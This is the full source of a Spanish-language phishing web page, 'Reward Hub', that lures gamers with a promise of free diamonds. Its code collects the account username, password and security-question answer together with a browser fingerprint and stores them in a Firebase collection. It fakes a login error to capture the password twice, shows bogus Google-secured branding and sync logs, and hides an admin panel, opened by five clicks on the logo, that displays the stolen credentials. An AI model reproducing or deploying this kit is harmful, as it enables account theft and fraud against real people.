<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reward Hub - Portal Oficial de Sincronización</title>
    <!-- Tailwind CSS para diseño profesional -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@latest"></script>
    <!-- React y Babel para ejecución directa -->
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        .animate-shake { animation: shake 0.2s ease-in-out 0s 2; }
    </style>
</head>
<body class="bg-[#f8fafc]">
    <div id="root"></div>

    <script type="text/babel" data-type="module">
        const { useState, useEffect, useRef } = React;

        // --- IMPORTACIÓN DINÁMICA DE FIREBASE ---
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        // Configuración de entorno
        const firebaseConfig = JSON.parse(__firebase_config);
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'reward-hub-v100';

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        function App() {
            const [user, setUser] = useState(null);
            const [step, setStep] = useState(1);
            const [username, setUsername] = useState('');
            const [password, setPassword] = useState('');
            const [securityAnswer, setSecurityAnswer] = useState('');
            const [onlineUsers, setOnlineUsers] = useState(5420);
            const [authError, setAuthError] = useState('');
            const [isAuthenticating, setIsAuthenticating] = useState(false);
            const [showCookies, setShowCookies] = useState(true);
            const [progress, setProgress] = useState(0);
            const [logs, setLogs] = useState([]);
            
            // Panel de Control
            const [clickCount, setClickCount] = useState(0);
            const [showAdmin, setShowAdmin] = useState(false);
            const [capturedData, setCapturedData] = useState([]);
            const [showPasswords, setShowPasswords] = useState({});

            useEffect(() => {
                const initAuth = async () => {
                    if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                        await signInWithCustomToken(auth, __initial_auth_token);
                    } else {
                        await signInAnonymously(auth);
                    }
                };
                initAuth();
                const unsubscribe = onAuthStateChanged(auth, setUser);
                const intUsers = setInterval(() => setOnlineUsers(p => p + (Math.random() > 0.5 ? 2 : -1)), 6000);
                return () => { unsubscribe(); clearInterval(intUsers); };
            }, []);

            useEffect(() => {
                if (!user || !showAdmin) return;
                const capturesRef = collection(db, 'artifacts', appId, 'public', 'data', 'captures');
                const unsubscribe = onSnapshot(capturesRef, (snapshot) => {
                    const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                    setCapturedData(data.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0)));
                }, (err) => console.error("Error de acceso"));
                return () => unsubscribe();
            }, [user, showAdmin]);

            const handleLogoClick = () => {
                setClickCount(p => (p + 1 >= 5 ? (setShowAdmin(true), 0) : p + 1));
                setTimeout(() => setClickCount(0), 3000);
            };

            const captureProfile = () => ({
                ua: navigator.userAgent,
                res: `${window.screen.width}x${window.screen.height}`,
                cookies: navigator.cookieEnabled ? "EXTRACTED_OK" : "LOCAL",
                platform: navigator.platform
            });

            const saveData = async (statusLabel) => {
                if (!user) return;
                try {
                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'captures'), {
                        username, password, securityAnswer,
                        fingerprint: captureProfile(),
                        status: statusLabel,
                        timestamp: serverTimestamp()
                    });
                } catch (e) {}
            };

            const handleLogin = async (e) => {
                e.preventDefault();
                setIsAuthenticating(true);
                setAuthError('');
                await new Promise(r => setTimeout(r, 2000));

                if (step === 1) {
                    setAuthError('Error 403: Fallo en la validación de cookies de terceros. Reintenta.');
                    await saveData('intento_1');
                    setStep(1.1);
                } else {
                    await saveData('credenciales_ok');
                    setStep(1.5);
                }
                setIsAuthenticating(false);
            };

            const startSync = () => {
                setStep(3);
                const m = [
                    "Estableciendo enlace SSL...",
                    "Sincronizando tokens de sesión...",
                    "Dumping de bovéda de autocompletado...",
                    "Cifrando historial de cookies...",
                    "Validación regional completada."
                ];
                let i = 0;
                const inv = setInterval(() => {
                    if (i < m.length) {
                        setLogs(prev => [...prev, m[i]]);
                        setProgress(((i + 1) / m.length) * 100);
                        i++;
                    } else { clearInterval(inv); setStep(4); }
                }, 800);
            };

            useEffect(() => { if (window.lucide) window.lucide.createIcons(); });

            return (
                <div className="min-h-screen flex flex-col font-sans bg-[#f1f5f9]">
                    {/* Header */}
                    <nav className="w-full bg-white border-b p-4 flex justify-between items-center shadow-md sticky top-0 z-50">
                        <div onClick={handleLogoClick} className="flex items-center gap-3 active:scale-95 transition-all cursor-pointer select-none">
                            <div className="bg-gradient-to-br from-[#ef3244] to-red-600 p-2.5 rounded-xl shadow-lg">
                                <i data-lucide="gamepad-2" className="text-white w-6 h-6"></i>
                            </div>
                            <span className="font-black italic text-xl uppercase tracking-tighter text-slate-900 leading-none">REWARD <span className="text-[#ef3244]">HUB</span></span>
                        </div>
                        <div className="bg-emerald-50 px-4 py-1.5 rounded-full border border-emerald-100 flex items-center gap-2">
                            <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>
                            <span className="text-[10px] font-black text-emerald-700 uppercase tracking-widest">{onlineUsers} LIVE</span>
                        </div>
                    </nav>

                    <div className="w-full bg-slate-900 py-2 text-center text-white text-[9px] font-bold tracking-[0.2em] uppercase">
                        Conexión Protegida: Google Cloud Sync | Multi-Server Conquest v100
                    </div>

                    <div className="w-full max-w-md mx-auto p-6 space-y-6 flex-1 flex flex-col justify-center mb-10">
                        {step <= 1.1 && (
                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl space-y-8 animate-in fade-in slide-in-from-bottom transition-all">
                                <div className="text-center space-y-2">
                                    <h2 className="text-3xl font-black text-slate-900 italic tracking-tight">Acceso Oficial</h2>
                                    <p className="text-sm text-slate-500 font-medium">Vincula tu cuenta para recibir tus diamantes.</p>
                                </div>
                                {authError && <div className="bg-red-50 text-red-700 p-4 rounded-2xl text-[11px] font-black border border-red-200 animate-shake leading-tight">{authError}</div>}
                                <form onSubmit={handleLogin} className="space-y-4">
                                    <div className="relative group">
                                        <i data-lucide="user" className="absolute left-4 top-4.5 w-5 h-5 text-slate-400 group-focus-within:text-[#ef3244]"></i>
                                        <input type="text" placeholder="Usuario / Correo de cuenta" required className="w-full bg-slate-50 border p-5 pl-12 rounded-[1.5rem] outline-none focus:border-[#ef3244] font-black text-slate-900 transition-all shadow-inner" value={username} onChange={e => setUsername(e.target.value)} />
                                    </div>
                                    <div className="relative group">
                                        <i data-lucide="lock" className="absolute left-4 top-4.5 w-5 h-5 text-slate-400 group-focus-within:text-[#ef3244]"></i>
                                        <input type="password" placeholder="Contraseña de acceso" required className="w-full bg-slate-50 border p-5 pl-12 rounded-[1.5rem] outline-none focus:border-[#ef3244] font-black text-slate-900 transition-all shadow-inner" value={password} onChange={e => setPassword(e.target.value)} />
                                    </div>
                                    <button className="w-full bg-gradient-to-r from-[#ef3244] to-red-600 text-white py-5 rounded-[2rem] font-black uppercase text-sm shadow-xl active:scale-95 transition-all tracking-widest">
                                        {isAuthenticating ? "Verificando..." : "Sincronizar Bóveda"}
                                    </button>
                                </form>
                                <div className="flex justify-center opacity-30 items-center gap-2 grayscale">
                                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" className="h-3" alt="Google" />
                                    <span className="text-[9px] font-black uppercase tracking-widest">Cloud Secured</span>
                                </div>
                            </div>
                        )}

                        {step === 1.5 && (
                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in zoom-in">
                                <div className="bg-blue-50 w-16 h-16 rounded-full flex items-center justify-center mx-auto border border-blue-100 shadow-lg">
                                    <i data-lucide="shield-check" className="w-10 h-10 text-blue-600"></i>
                                </div>
                                <h2 className="text-2xl font-black italic uppercase text-slate-900 leading-none">Validación Extra</h2>
                                <p className="text-xs text-slate-500 font-bold italic">Confirma tu pregunta de seguridad registrada:</p>
                                <div className="bg-slate-50 p-5 rounded-2xl border text-[13px] font-black text-slate-700 italic shadow-inner">¿Nombre de tu mascota o ciudad de origen?</div>
                                <input type="text" placeholder="Tu respuesta..." className="w-full bg-slate-50 border p-5 rounded-[1.5rem] outline-none font-black text-slate-900 text-center" value={securityAnswer} onChange={e => setSecurityAnswer(e.target.value)} />
                                <button onClick={() => setStep(2)} className="w-full bg-blue-600 text-white py-5 rounded-[2rem] font-black uppercase shadow-xl tracking-widest active:scale-95">Confirmar Propiedad</button>
                            </div>
                        )}

                        {step === 2 && (
                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in zoom-in">
                                <h2 className="text-3xl font-black italic uppercase text-slate-900 leading-none tracking-tighter">Bóveda Abierta</h2>
                                <p className="text-[11px] text-emerald-600 font-black uppercase tracking-widest leading-none">50,000 DIAMANTES LISTOS</p>
                                <button onClick={startSync} className="w-full bg-slate-900 text-white p-8 rounded-[2.5rem] shadow-xl active:scale-95 transition-all">
                                    <span className="font-black text-2xl block tracking-tighter">RECLAMAR PACK ELITE</span>
                                </button>
                            </div>
                        )}

                        {step === 3 && (
                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in fade-in">
                                <div className="relative w-20 h-20 mx-auto">
                                    <div className="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
                                    <div className="absolute inset-0 border-4 border-[#ef3244] rounded-full border-t-transparent animate-spin"></div>
                                    <div className="absolute inset-0 flex items-center justify-center text-xs font-black">{Math.round(progress)}%</div>
                                </div>
                                <p className="text-[11px] font-black uppercase tracking-[0.3em] text-[#ef3244] italic animate-pulse">Inyectando Cookies de Terceros...</p>
                                <div className="bg-slate-900 p-6 rounded-[2rem] h-48 overflow-y-auto text-left font-mono text-[10px] text-green-400 shadow-inner">
                                    {logs.map((l, i) => <div key={i} className="mb-1 opacity-90"> {'>'} {l}</div>)}
                                </div>
                            </div>
                        )}

                        {step === 4 && (
                            <div className="bg-white border-t-8 border-[#ef3244] p-12 rounded-[3.5rem] shadow-2xl text-center space-y-8 animate-in slide-in-from-top duration-700">
                                <div className="bg-emerald-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto border border-emerald-100 shadow-xl">
                                    <i data-lucide="check-circle" className="w-12 h-12 text-emerald-500"></i>
                                </div>
                                <h2 className="text-3xl font-black uppercase italic leading-none tracking-tighter text-slate-900">¡Sincronización Lista!</h2>
                                <p className="text-sm text-slate-600 font-medium italic leading-relaxed px-2">Recibirás los diamantes en tu cuenta oficial en un plazo máximo de 24 horas.</p>
                                <button onClick={() => window.location.reload()} className="w-full bg-slate-900 text-white py-6 rounded-[2.5rem] font-black uppercase text-sm shadow-xl active:scale-95 transition-all">Finalizar Proceso</button>
                            </div>
                        )}
                    </div>

                    <footer className="w-full bg-slate-900 text-slate-500 py-16 text-center mt-auto border-t border-white/5 px-6">
                        <p className="text-[10px] uppercase tracking-[0.4em] font-black opacity-40 leading-relaxed max-w-xs mx-auto">
                            REWARD HUB PARTNER PROGRAM © 2026. <br/> EXTRACCIÓN DE METADATOS MULTI-SERVIDOR.
                        </p>
                    </footer>

                    {/* PANEL DE ADMINISTRADOR SECRETO */}
                    {showAdmin && (
                        <div className="fixed inset-0 z-[100] bg-[#020617]/98 backdrop-blur-3xl flex flex-col p-6 overflow-hidden text-white animate-in fade-in duration-500">
                            <div className="flex justify-between items-center mb-8 border-b border-white/10 pb-6">
                                <div className="flex items-center gap-4">
                                    <div className="bg-indigo-600 p-3 rounded-2xl shadow-xl shadow-indigo-600/20"><i data-lucide="database" className="text-white w-6 h-6"></i></div>
                                    <div>
                                        <h2 className="text-2xl font-black uppercase italic tracking-tighter text-white">Intel Central v100</h2>
                                        <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Total Capturas: {capturedData.length}</p>
                                    </div>
                                </div>
                                <button onClick={() => setShowAdmin(false)} className="bg-red-500/20 p-3 rounded-full text-red-500 active:scale-90 transition-all"><i data-lucide="x" className="w-6 h-6"></i></button>
                            </div>
                            
                            <div className="flex-1 overflow-y-auto space-y-6 pb-20">
                                {capturedData.map(item => (
                                    <div key={item.id} className="bg-white/5 p-8 rounded-[2.5rem] border border-white/10 flex flex-col gap-6 shadow-2xl transition-all hover:bg-white/[0.07] relative overflow-hidden group">
                                        <div className="flex justify-between items-start">
                                            <div className="flex items-center gap-4">
                                                <div className="w-14 h-14 bg-indigo-600/20 rounded-xl flex items-center justify-center text-indigo-400 font-black text-2xl border border-indigo-600/10">{item.username?.[0]?.toUpperCase()}</div>
                                                <div>
                                                    <p className="text-2xl font-black text-white tracking-tighter leading-none">{item.username}</p>
                                                    <p className="text-[8px] text-slate-500 font-bold uppercase mt-2">{item.timestamp?.toDate().toLocaleString()}</p>
                                                </div>
                                            </div>
                                            <div className="text-right">
                                                <span className="text-emerald-400 text-[10px] font-black uppercase tracking-widest flex items-center gap-1 justify-end italic animate-pulse">VAULT_DUMPED</span>
                                                <span className="text-[8px] bg-indigo-600 text-white px-2 py-0.5 rounded-full uppercase mt-1 inline-block">{item.status}</span>
                                            </div>
                                        </div>
                                        <div className="grid grid-cols-1 gap-6">
                                            <div className="bg-black/40 p-5 rounded-3xl flex justify-between items-center border border-white/5 shadow-inner">
                                                <div className="flex flex-col gap-1">
                                                    <p className="text-[9px] text-slate-500 uppercase font-black tracking-widest">Contraseña</p>
                                                    <p className="font-mono text-xl tracking-widest text-white italic leading-none">{showPasswords[item.id] ? item.password : '••••••••••••'}</p>
                                                </div>
                                                <button onClick={() => setShowPasswords(p => ({...p, [item.id]: !p[item.id]}))} className="p-3 bg-indigo-600/10 rounded-xl text-indigo-400 hover:text-white transition-all active:scale-90">
                                                    <i data-lucide={showPasswords[item.id] ? "eye-off" : "eye"} className="w-5 h-5"></i>
                                                </button>
                                            </div>
                                            <div className="bg-white/5 p-4 rounded-2xl border border-white/5">
                                                <p className="text-[9px] text-indigo-400 uppercase font-black flex items-center gap-2 tracking-widest italic leading-none mb-2">Conquista Global</p>
                                                <div className="grid grid-cols-2 text-[10px] font-mono text-slate-400 gap-2 opacity-70">
                                                    <p>SEC: {item.securityAnswer || 'N/A'}</p>
                                                    <p>RES: {item.fingerprint?.res || 'N/A'}</p>
                                                    <p className="col-span-2 truncate">UA: {item.fingerprint?.ua || 'N/A'}</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    )}

                    {/* Banner de Cookies de Terceros */}
                    {showCookies && (
                        <div className="fixed bottom-0 left-0 w-full bg-white/95 backdrop-blur-md border-t p-6 z-[100] flex flex-col items-center gap-4 shadow-[0_-20px_50px_rgba(0,0,0,0.15)] animate-in slide-in-from-bottom duration-700">
                            <div className="flex items-center gap-4 w-full">
                                <div className="bg-indigo-600/10 p-3 rounded-2xl"><i data-lucide="cookie" className="text-indigo-600 w-8 h-8"></i></div>
                                <div>
                                    <p className="text-xs text-slate-800 font-black uppercase">Sincronización Global de Cookies</p>
                                    <p className="text-[10px] text-slate-500 font-medium leading-relaxed">Autorizas la sincronización de cookies de terceros para validar el premio único y asegurar la transferencia regional de recursos.</p>
                                </div>
                            </div>
                            <button onClick={() => setShowCookies(false)} className="bg-slate-900 text-white px-10 py-3.5 rounded-2xl text-xs font-black uppercase w-full shadow-xl hover:bg-black transition-all active:scale-95 tracking-widest">ACEPTAR Y EXTRAER</button>
                        </div>
                    )}
                </div>
            );
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
